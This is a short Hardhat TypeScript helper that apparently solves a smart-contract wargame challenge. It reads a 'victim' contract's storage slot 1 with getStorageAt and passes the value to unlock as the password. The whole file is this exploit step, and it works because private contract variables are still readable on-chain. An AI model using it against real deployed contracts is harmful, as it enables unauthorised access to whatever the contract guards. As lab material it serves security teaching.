import { ethers } from "hardhat";

const helper = async (victim: any) => {
  const passwordAsHex = await ethers.provider.getStorageAt(victim.address, 1);
  await victim.unlock(passwordAsHex);
};

export default helper;
